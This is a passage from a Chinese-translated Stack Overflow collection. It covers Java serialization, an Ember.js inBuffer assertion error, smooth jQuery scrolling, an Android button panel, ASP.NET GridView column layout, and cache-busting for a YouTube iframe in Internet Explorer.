如果您选择第二种方法，[此链接](https://stackoverflow.com/questions/4118751/how-do-i-serialize-an-object-and-save-it-to-a-file-in-android)将帮助您如何序列化您的对象（包含两个列表的类）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-17T13:47:03.127

最简单的是使用 java `Serialisation`，您将其写入文件。
如果列表很大（千元素），那么可以使用自定义序列化来编写`DataOutputStream`。这使用更少的空间，速度更快，但更多的工作。

# ember.js - ember 未捕获错误：断言失败：清空处于 inBuffer 状态的视图

> ID：14379979
> 
> 赞同：17
> 
> 时间：2013-01-17T13:16:15.170
> 
> 标签：ember.js, ember-data, ember-old-router

运行下面的代码时，我得到了这个断言：

> 清空处于 inBuffer 状态的视图是不允许的，在正常情况下也不应该发生。您的应用程序中很可能存在错误。这可能是由于过多的属性更改通知。

演示链接：http: [//plnkr.co/edit/s3bUw4JFrJvsL690QUMi](http://plnkr.co/edit/s3bUw4JFrJvsL690QUMi)

```
var App = Ember.Application.create({
  Store: DS.Store.extend({
    revision: 4,
    adapter: DS.FixtureAdapter.create()
  }),

  Router: Ember.Router.extend({
    root: Ember.Route.extend({
      index: Ember.Route.extend({
        route: "/",
        connectOutlets: function(router){
          var person;
          person = App.Person.find(657);
          person.addObserver("isLoaded", function() {
            return router.get('router.applicationController').connectOutlet("things", person.get("things"));
          });
        }
      })
    })
  }),

  ApplicationController: Em.Controller.extend(),

  ApplicationView: Em.View.extend({
    template: Em.Handlebars.compile("{{outlet}}")
  }),

  ThingsController: Em.ArrayController.extend({
    thingTypes: (function() {
      return App.ThingType.find();
    }).property()
  }),

  ThingsView: Em.View.extend({
    template: Em.Handlebars.compile([
      '{{#each controller.thingTypes}}', 
        '{{this.name}}', 
      '{{/each}}',
      '{{#each controller.content}}', 
        '{{this.title}}', 
      '{{/each}}'].join(""))
  }),

  //MODELS
  Person: DS.Model.extend({
    things: DS.hasMany('App.Thing', {
      embedded: true
    })
  }),

  Thing: DS.Model.extend({
    description: DS.attr('string'),
    thingType: DS.belongsTo("App.ThingType", {
      embedded: true
    }),
    title: (function() {
      return this.get("thingType.name");
    }).property("description")
  }),

  ThingType: DS.Model.extend({
    name: DS.attr("string")
  })
});

App.Person.FIXTURES = [
  {
    id: 657,
    things: [
      {
        id: 1,
        description: "Some text",
        thing_type: {
          id: 1,
          name: "type 1"
        }
      }, {
        id: 2,
        description: "Some text",
        thing_type: {
          id: 2,
          name: "type 2"
        }
      }
    ]
  }
];

App.ThingType.FIXTURES = [
  {
    id: 1,
    name: "type 1"
  }, {
    id: 2,
    name: "type 2"
  }, {
    id: 3,
    name: "type 3"
  }
]; 
```

为什么会这样？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-02-26T15:26:19.297

我在尝试从固定装置加载下拉值列表时遇到了同样的错误。解决它的是覆盖夹具适配器上的*queryFixtures ：*

```
App.FixtureAdapter = DS.FixtureAdapter.extend
  latency: 200
  queryFixtures: (records, query, type) ->
    records.filter (record) ->
      for key of query
        continue  unless query.hasOwnProperty(key)
        value = query[key]
        return false  if record[key] isnt value
      true 
```

*如果我没有先设置延迟*，我可能不会想出来。然后错误更具描述性。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-12-14T01:20:45.947

我想有点晚了......但我让它在这里工作：http: [//plnkr.co/edit/hDCT4Qy1h5aE6GjM76qp](http://plnkr.co/edit/hDCT4Qy1h5aE6GjM76qp)

没有改变逻辑，但它被称为

我这样修改了你的路由器：

```
Router: Ember.Router.extend({
    root: Ember.Route.extend({
      index: Ember.Route.extend({
        route: "/",
        connectOutlets: function(router) {
          var person;
          router.set('router.applicationController.currentPerson', App.Person.find(657));
        }
      })
    })
  }) 
```

并创建了一个ApplicationController：

```
ApplicationController: Em.Controller.extend({
    currentPerson: null,
    currentPersonLoaded: function() {
      this.connectOutlet("things", this.get("currentPerson.things"));
    }.observes("currentPerson.isLoaded"),
  }) 
```

我不知道这是否是您想要的输出，但错误消失了！

# jquery - 将css位置转换为jquery平滑滑动

> ID：14379987
> 
> 赞同：1
> 
> 时间：2013-01-17T13:16:35.887
> 
> 标签：jquery, css

我目前有一个`<div>`在页面向上或向下移动时保持其在页面左侧顶部的位置。这工作正常，但不是很顺利。

我正在寻找重新考虑下面的代码以使其平滑滚动。目前，当触发器发生时，它只是设置 CSS`top`属性——这使得它“抖动”。我有点不确定如何使它成为一个平滑的滚动动作，而不是将 css 顶部值设置为其确切位置

```
 //scrolling menu
    if($("#selectedOptions").length > 0){   //if the element exists
        $(window).scroll(function(){
            var div = $("#selectedOptions");        // the div that slides
            if(div) {                               
                var pos = div.parent().position().top;  //position of the top of the wrapper
                var windowPos = $(window).scrollTop();  //current window postion

                //top of moving div not to go further than
                var bottom = $("#sizeAndQuantHeader").position().top; //where the div shouldn't go past 

                //de-bug
                //console.log("pos: " + pos + " - winpos" + windowPos + ", heih: " + divHieght + " doc he: " + $(document).height() + " bott" + bottom);

                //if between the range then display at new postion
                if (windowPos > pos && (windowPos < bottom)) {
                    div.css("top", windowPos-pos);
                    //must be higher than its current position so set to 0
                 } else if (windowPos < pos && windowPos < bottom) {
                     div.css("top", 0);
                } 
            }
        });
    } 
```

任何有关如何使`<div>`页面平滑滚动的帮助或提示将不胜感激。

**更新

不幸的是，我的元素已经在不同的页面区域滚动：

```
var _scrollTo = function(div){
    $('html,body').animate({
        scrollTop: div.offset().top},
        'slow');
}; 
```

现在，当调用上面的函数时，我认为它会触发调用：

```
 $(window).scroll(function(){animate div... 
```

并延迟新动画 div 的滚动。我也不能使用回调，因为它在其他地方被重复使用。我可能在这里遗漏了一些东西，所以我求助于没有动画。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-17T13:21:00.440

使用 Animate 使其平滑。

```
div.animate({ top: windowPos-pos }, 300); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-17T13:22:36.353

关键是在这里更改此代码：

```
if (windowPos > pos && (windowPos < bottom)) {
    div.css("top", windowPos-pos);
    //must be higher than its current position so set to 0
} else if (windowPos < pos && windowPos < bottom) {
    div.css("top", 0);
} 
```

到

```
if (windowPos > pos && (windowPos < bottom)) {
    div.animate({top: windowPos-pos}, 100);
    //must be higher than its current position so set to 0
} else if (windowPos < pos && windowPos < bottom) {
    div.animate({top: "0"}, 100);
} 
```

[jQuery`animate()`](http://api.jquery.com/animate/)真的很容易使用/操作。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-07-07T08:37:22.187

将 CSS 添加到 div (#selectedOptions)

```
transition: all 0.5s ease 0s;
-moz-transition: all 0.5s ease 0s;
-webkit-transition: all 0.5s ease 0s;
-o-transition: all 0.5s ease 0s; 
```

它会自动顺利进行。

# java - 如何创建像 Android Google Plus App 这样的按钮

> ID：14379988
> 
> 赞同：6
> 
> 时间：2013-01-17T13:16:42.253
> 
> 标签：java, android, android-layout, android-button

我是 Android 开发的新手，我想知道是否有任何示例可用于创建类似于 android 上 google+ 应用程序底部的照片/签到/心情/写面板的面板。

1）它们是 4 个按钮吗？如何设置按钮的样式以使其看起来像这样？

2）我想在向下滚动时自动隐藏面板，但在向上滚动时显示。

感谢是否有人可以引导我朝着正确的方向前进。

干杯

![安卓谷歌加应用](../Images/47892e86697eb5f3ba7e707bea328459.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-17T13:22:26.520

显示\隐藏面板 - 使用[动画](http://developer.android.com/guide/topics/graphics/view-animation.html)。

这个面板可以是带有 4 个按钮的线性布局。

检测滚动查看的内容：[同步 ScrollView 滚动位置 - android](https://stackoverflow.com/questions/3948934/synchronise-scrollview-scroll-positions-android)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-11-22T22:09:07.413

好的，所以我完全实现了您在没有按钮的情况下尝试做的事情。

经过大量时间在谷歌上搜索后，我找到了这个 - [https://gist.github.com/imminent/4576886](https://gist.github.com/imminent/4576886)，作者是 Dandre' Allison，这是一个特定的快速返回栏植入列表视图，它比其他视图更棘手查看组件。有关快速返回栏和其他滚动技巧的更多实现，您可以在[https://plus.google.com/u/0/+RomanNurik/posts/1Sb549FvpJt](https://plus.google.com/u/0/+RomanNurik/posts/1Sb549FvpJt)和[http://www.androidviews 使用 Roman Nurik 的滚动技巧库。净/2012/11/滚动技巧/](http://www.androidviews.net/2012/11/scrolling-tricks/)。我刚刚看到，在我从未测试过的[https://github.com/LarsWerkman/QuickReturnListView](https://github.com/LarsWerkman/QuickReturnListView)中，Lars Werkman 有另一个用于列表视图实施的快速返回栏。我使用了 Dandre 的 Allison 片段，效果很好。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-17T13:36:07.410

您可以使用linearlayout并在其中获取imageview ..滚动时您可以显示/隐藏linearlayout ..对于视图，您可以使用linearlayout颜色为黑色和此imageview图像..

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-11-09T10:05:20.537

回答你的第一个问题。

*   所有按钮都在 ImageButton 或 ImageView 中，使其可点击。您可以在 LinearLayout 或 RelativeLayout 中进行布局，这取决于您要如何制作它。

* * *

## 回答 #5

> 赞同：-4
> 
> 时间：2013-01-17T13:23:10.533

尝试 [使用拆分操作栏](http://developer.android.com/guide/topics/ui/actionbar.html)，这基本上可以为您完成任务。

# asp.net - asp.net GridView，在单列内多行显示多列

> ID：14379990
> 
> 赞同：0
> 
> 时间：2013-01-17T13:16:49.610
> 
> 标签：asp.net, gridview, datagrid

假设在 asp.net gridView 中有 8 列。col1, col2, col3, col4, col5, col6,....我希望他们这样安排：

```
-----------------------------
col_one | col_two | col_three
-----------------------------
col1     col4      col6  
col2     col5      col7
col3          

----------------------------- 
```

我怎么能那样做？

我在谷歌上搜索并找到了一篇文章[，](http://www.codeproject.com/Articles/16777/Merging-DataGrid-header-columns)它在一列内排列了几列，但没有将排列的列放在不同的行中。

我可以在这里发布什么代码......我只是在寻找方式......

如何做到这一点？

我应该切换到数据网格，为什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-17T13:35:41.250

如果需要，您应该使用`TemplateField`然后为特定模式设置模板，如下所示：

```
 <asp:GridView ID="GridView1" runat="server" DataKeyNames="Id" DataSourceID="ObjectDataSource1" AutoGenerateColumns="false">
        <Columns>
            <asp:TemplateField HeaderText="col_one">
                <ItemTemplate>
                    <asp:Label ID="Label1" runat="server" Text='<%# Eval("col1") %>'></asp:Label><br />
                    <asp:Label ID="Label2" runat="server" Text='<%# Eval("col2") %>'></asp:Label><br />
                    <asp:Label ID="Label3" runat="server" Text='<%# Eval("col3") %>'></asp:Label>
                </ItemTemplate>
            </asp:TemplateField>
            <asp:TemplateField HeaderText="col_two">
                <ItemTemplate>
                    <asp:Label ID="Label1" runat="server" Text='<%# Eval("col4") %>'></asp:Label><br />
                    <asp:Label ID="Label2" runat="server" Text='<%# Eval("col5") %>'></asp:Label>
                </ItemTemplate>
            </asp:TemplateField>
            <asp:TemplateField HeaderText="col_three">
                <ItemTemplate>
                    <asp:Label ID="Label1" runat="server" Text='<%# Eval("col6") %>'></asp:Label><br />
                    <asp:Label ID="Label2" runat="server" Text='<%# Eval("col7") %>'></asp:Label>
                </ItemTemplate>
            </asp:TemplateField>
        </Columns>
    </asp:GridView>
    <asp:ObjectDataSource ID="ObjectDataSource1" runat="server" SelectMethod="GetItems" TypeName="WebTester.DataGridTester">
    </asp:ObjectDataSource> 
```

和页面代码：

```
 public static DataTable GetItems()
    { 
        //generate some demo data...
        DataTable dt = new DataTable();
        dt.Columns.Add("Id",typeof(int));
        dt.Columns.Add("col1", typeof(string));
        dt.Columns.Add("col2", typeof(string));
        dt.Columns.Add("col3", typeof(string));
        dt.Columns.Add("col4", typeof(string));
        dt.Columns.Add("col5", typeof(string));
        dt.Columns.Add("col6", typeof(string));
        dt.Columns.Add("col7", typeof(string));
        dt.Rows.Add(new object[] {1,"some","data","in","first","row", ".", ".." });
        dt.Rows.Add(new object[] { 2, "second", "record", "inside", "demo", "datatable", "-", "--" });
        return dt;
    } 
```

# iframe - asp.net page with iframe with youtube video sometimes requires refresh

> ID：14379996
> 
> 赞同：0
> 
> 时间：2013-01-17T13:17:04.290
> 
> 标签：iframe, youtube-api

I have an asp.net page with an iframe in it that shows a youtube video. I have buttons that use the youtube api to control the video. I'm finding that often the video doesn't show up, and I have to do a view-refresh to make it work. This problem is limited to Internet Explorer, I believe that Google chrome does not have the same problem.
I've been told not to use iframes at all by a tech support person at the server company that hosts my site. They say people are moving away from iframes, and that I should use other methods of embedding youtube videos.
I could certainly do that, but youtube recommends using iframes, because they are more flexible. If I could make the 'refresh' problem predictable, I would submit it to Microsoft, but I can't figure out why it happens sometimes, but not other times. I could also force a refresh. My question is, does anyone have a clue why this bug is happening. Thanks.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-17T13:26:33.543

IFRAME 内容经常发生这种情况。我相信这与 Internet Explorer 缓存内容的方式有关，但老实说，我不确定细节。

我可以分享的是我们过去在对话框中使用的一个老技巧。

说你的 src 属性是`"http://www.youtube.com/watch?v=1wL7RHoDnxs"`

您可以在该 GET 字符串上添加一个额外的参数，例如：-

```
"http://www.youtube.com/watch?v=1wL7RHoDnxs&doesntmatter=203933" 
```

看到那里的额外`doesntmatter`参数了吗？该值是随机的，或基于时间戳。你的选择。诀窍是每次给 IE 一个不同的 URL。这将阻止它尝试为您的 IFRAME 内容使用缓存。